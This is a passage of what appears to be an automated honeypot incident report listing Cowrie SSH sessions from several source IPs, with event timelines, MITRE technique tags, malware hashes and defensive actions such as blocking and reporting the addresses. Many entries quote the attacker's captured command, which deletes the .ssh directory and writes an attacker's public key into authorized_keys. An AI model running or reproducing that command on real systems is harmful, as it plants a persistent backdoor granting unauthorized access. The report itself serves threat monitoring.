| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:55:11` | `cowrie.session.connect` |
| `2026-06-08 12:55:11` | `cowrie.client.version` |
| `2026-06-08 12:55:11` | `cowrie.client.kex` |
| `2026-06-08 12:55:12` | `cowrie.login.success` |
| `2026-06-08 12:55:12` | `cowrie.session.params` |
| `2026-06-08 12:55:12` | `cowrie.command.input` |
| `2026-06-08 12:55:12` | `cowrie.command.failed` |
| `2026-06-08 12:55:13` | `cowrie.log.closed` |
| `2026-06-08 12:55:13` | `cowrie.session.params` |
| `2026-06-08 12:55:13` | `cowrie.command.input` |
| `2026-06-08 12:55:14` | `cowrie.session.file_download` |
| `2026-06-08 12:55:14` | `cowrie.log.closed` |
| `2026-06-08 12:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e9ab7ec124

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 12:55 |
| **Last Seen** | 2026-06-08 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:55:16` | `cowrie.session.connect` |
| `2026-06-08 12:55:16` | `cowrie.client.version` |
| `2026-06-08 12:55:17` | `cowrie.client.kex` |
| `2026-06-08 12:55:18` | `cowrie.login.success` |
| `2026-06-08 12:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c7a2f88b60

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:56 |
| **Last Seen** | 2026-06-08 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:56:17` | `cowrie.session.connect` |
| `2026-06-08 12:56:17` | `cowrie.client.version` |
| `2026-06-08 12:56:17` | `cowrie.client.kex` |
| `2026-06-08 12:56:17` | `cowrie.login.success` |
| `2026-06-08 12:56:18` | `cowrie.session.params` |
| `2026-06-08 12:56:18` | `cowrie.command.input` |
| `2026-06-08 12:56:18` | `cowrie.command.failed` |
| `2026-06-08 12:56:18` | `cowrie.log.closed` |
| `2026-06-08 12:56:18` | `cowrie.session.params` |
| `2026-06-08 12:56:18` | `cowrie.command.input` |
| `2026-06-08 12:56:18` | `cowrie.session.file_download` |
| `2026-06-08 12:56:18` | `cowrie.log.closed` |
| `2026-06-08 12:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a35dbf3b3c8c

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:56 |
| **Last Seen** | 2026-06-08 12:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:56:20` | `cowrie.session.connect` |
| `2026-06-08 12:56:20` | `cowrie.client.version` |
| `2026-06-08 12:56:20` | `cowrie.client.kex` |
| `2026-06-08 12:56:21` | `cowrie.login.success` |
| `2026-06-08 12:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1435fe783e14

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 12:56 |
| **Last Seen** | 2026-06-08 12:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:56:39` | `cowrie.session.connect` |
| `2026-06-08 12:56:39` | `cowrie.client.version` |
| `2026-06-08 12:56:39` | `cowrie.client.kex` |
| `2026-06-08 12:56:40` | `cowrie.login.success` |
| `2026-06-08 12:56:41` | `cowrie.session.params` |
| `2026-06-08 12:56:41` | `cowrie.command.input` |
| `2026-06-08 12:56:41` | `cowrie.command.failed` |
| `2026-06-08 12:56:42` | `cowrie.log.closed` |
| `2026-06-08 12:56:42` | `cowrie.session.params` |
| `2026-06-08 12:56:42` | `cowrie.command.input` |
| `2026-06-08 12:56:43` | `cowrie.session.file_download` |
| `2026-06-08 12:56:43` | `cowrie.log.closed` |
| `2026-06-08 12:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1688926de8eb

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 12:56 |
| **Last Seen** | 2026-06-08 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:56:46` | `cowrie.session.connect` |
| `2026-06-08 12:56:46` | `cowrie.client.version` |
| `2026-06-08 12:56:47` | `cowrie.client.kex` |
| `2026-06-08 12:56:48` | `cowrie.login.success` |
| `2026-06-08 12:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bafafc136cd

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:59 |
| **Last Seen** | 2026-06-08 12:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:59:43` | `cowrie.session.connect` |
| `2026-06-08 12:59:43` | `cowrie.client.version` |
| `2026-06-08 12:59:44` | `cowrie.client.kex` |
| `2026-06-08 12:59:44` | `cowrie.login.success` |
| `2026-06-08 12:59:44` | `cowrie.session.params` |
| `2026-06-08 12:59:44` | `cowrie.command.input` |
| `2026-06-08 12:59:44` | `cowrie.command.failed` |
| `2026-06-08 12:59:45` | `cowrie.log.closed` |
| `2026-06-08 12:59:45` | `cowrie.session.params` |
| `2026-06-08 12:59:45` | `cowrie.command.input` |
| `2026-06-08 12:59:45` | `cowrie.session.file_download` |
| `2026-06-08 12:59:45` | `cowrie.log.closed` |
| `2026-06-08 12:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f1e99b49738

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 12:59 |
| **Last Seen** | 2026-06-08 12:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:59:47` | `cowrie.session.connect` |
| `2026-06-08 12:59:47` | `cowrie.client.version` |
| `2026-06-08 12:59:47` | `cowrie.client.kex` |
| `2026-06-08 12:59:48` | `cowrie.login.success` |
| `2026-06-08 12:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43d8a21b6886

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:01 |
| **Last Seen** | 2026-06-08 13:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:01:27` | `cowrie.session.connect` |
| `2026-06-08 13:01:27` | `cowrie.client.version` |
| `2026-06-08 13:01:28` | `cowrie.client.kex` |
| `2026-06-08 13:01:28` | `cowrie.login.success` |
| `2026-06-08 13:01:28` | `cowrie.session.params` |
| `2026-06-08 13:01:28` | `cowrie.command.input` |
| `2026-06-08 13:01:28` | `cowrie.command.failed` |
| `2026-06-08 13:01:29` | `cowrie.log.closed` |
| `2026-06-08 13:01:29` | `cowrie.session.params` |
| `2026-06-08 13:01:29` | `cowrie.command.input` |
| `2026-06-08 13:01:29` | `cowrie.session.file_download` |
| `2026-06-08 13:01:29` | `cowrie.log.closed` |
| `2026-06-08 13:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e3fdac61c8

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:01 |
| **Last Seen** | 2026-06-08 13:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:01:31` | `cowrie.session.connect` |
| `2026-06-08 13:01:31` | `cowrie.client.version` |
| `2026-06-08 13:01:31` | `cowrie.client.kex` |
| `2026-06-08 13:01:32` | `cowrie.login.success` |
| `2026-06-08 13:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33b2332f7ce

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:02 |
| **Last Seen** | 2026-06-08 13:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:02:32` | `cowrie.session.connect` |
| `2026-06-08 13:02:32` | `cowrie.client.version` |
| `2026-06-08 13:02:32` | `cowrie.client.kex` |
| `2026-06-08 13:02:33` | `cowrie.login.success` |
| `2026-06-08 13:02:34` | `cowrie.session.params` |
| `2026-06-08 13:02:34` | `cowrie.command.input` |
| `2026-06-08 13:02:34` | `cowrie.command.failed` |
| `2026-06-08 13:02:34` | `cowrie.log.closed` |
| `2026-06-08 13:02:35` | `cowrie.session.params` |
| `2026-06-08 13:02:35` | `cowrie.command.input` |
| `2026-06-08 13:02:35` | `cowrie.session.file_download` |
| `2026-06-08 13:02:35` | `cowrie.log.closed` |
| `2026-06-08 13:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cb4bff91c7

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:02 |
| **Last Seen** | 2026-06-08 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:02:38` | `cowrie.session.connect` |
| `2026-06-08 13:02:38` | `cowrie.client.version` |
| `2026-06-08 13:02:38` | `cowrie.client.kex` |
| `2026-06-08 13:02:39` | `cowrie.login.success` |
| `2026-06-08 13:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49200e3fc369

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:03 |
| **Last Seen** | 2026-06-08 13:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:03:13` | `cowrie.session.connect` |
| `2026-06-08 13:03:13` | `cowrie.client.version` |
| `2026-06-08 13:03:13` | `cowrie.client.kex` |
| `2026-06-08 13:03:14` | `cowrie.login.success` |
| `2026-06-08 13:03:14` | `cowrie.session.params` |
| `2026-06-08 13:03:14` | `cowrie.command.input` |
| `2026-06-08 13:03:14` | `cowrie.command.failed` |
| `2026-06-08 13:03:14` | `cowrie.log.closed` |
| `2026-06-08 13:03:14` | `cowrie.session.params` |
| `2026-06-08 13:03:14` | `cowrie.command.input` |
| `2026-06-08 13:03:14` | `cowrie.session.file_download` |
| `2026-06-08 13:03:14` | `cowrie.log.closed` |
| `2026-06-08 13:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61577585cd6f

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:03 |
| **Last Seen** | 2026-06-08 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:03:16` | `cowrie.session.connect` |
| `2026-06-08 13:03:16` | `cowrie.client.version` |
| `2026-06-08 13:03:17` | `cowrie.client.kex` |
| `2026-06-08 13:03:17` | `cowrie.login.success` |
| `2026-06-08 13:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3247da0cf8f

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:03 |
| **Last Seen** | 2026-06-08 13:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:03:24` | `cowrie.session.connect` |
| `2026-06-08 13:03:24` | `cowrie.client.version` |
| `2026-06-08 13:03:24` | `cowrie.client.kex` |
| `2026-06-08 13:03:25` | `cowrie.login.success` |
| `2026-06-08 13:03:26` | `cowrie.session.params` |
| `2026-06-08 13:03:26` | `cowrie.command.input` |
| `2026-06-08 13:03:26` | `cowrie.command.failed` |
| `2026-06-08 13:03:26` | `cowrie.log.closed` |
| `2026-06-08 13:03:27` | `cowrie.session.params` |
| `2026-06-08 13:03:27` | `cowrie.command.input` |
| `2026-06-08 13:03:27` | `cowrie.session.file_download` |
| `2026-06-08 13:03:27` | `cowrie.log.closed` |
| `2026-06-08 13:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e894f90517

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:03 |
| **Last Seen** | 2026-06-08 13:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:03:31` | `cowrie.session.connect` |
| `2026-06-08 13:03:31` | `cowrie.client.version` |
| `2026-06-08 13:03:31` | `cowrie.client.kex` |
| `2026-06-08 13:03:33` | `cowrie.login.success` |
| `2026-06-08 13:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb7c44d31d5

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:03 |
| **Last Seen** | 2026-06-08 13:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:03:54` | `cowrie.session.connect` |
| `2026-06-08 13:03:54` | `cowrie.client.version` |
| `2026-06-08 13:03:54` | `cowrie.client.kex` |
| `2026-06-08 13:03:55` | `cowrie.login.success` |
| `2026-06-08 13:03:55` | `cowrie.session.params` |
| `2026-06-08 13:03:55` | `cowrie.command.input` |
| `2026-06-08 13:03:55` | `cowrie.command.failed` |
| `2026-06-08 13:03:56` | `cowrie.log.closed` |
| `2026-06-08 13:03:56` | `cowrie.session.params` |
| `2026-06-08 13:03:56` | `cowrie.command.input` |
| `2026-06-08 13:03:56` | `cowrie.session.file_download` |
| `2026-06-08 13:03:56` | `cowrie.log.closed` |
| `2026-06-08 13:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-654b34a60627

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:03 |
| **Last Seen** | 2026-06-08 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

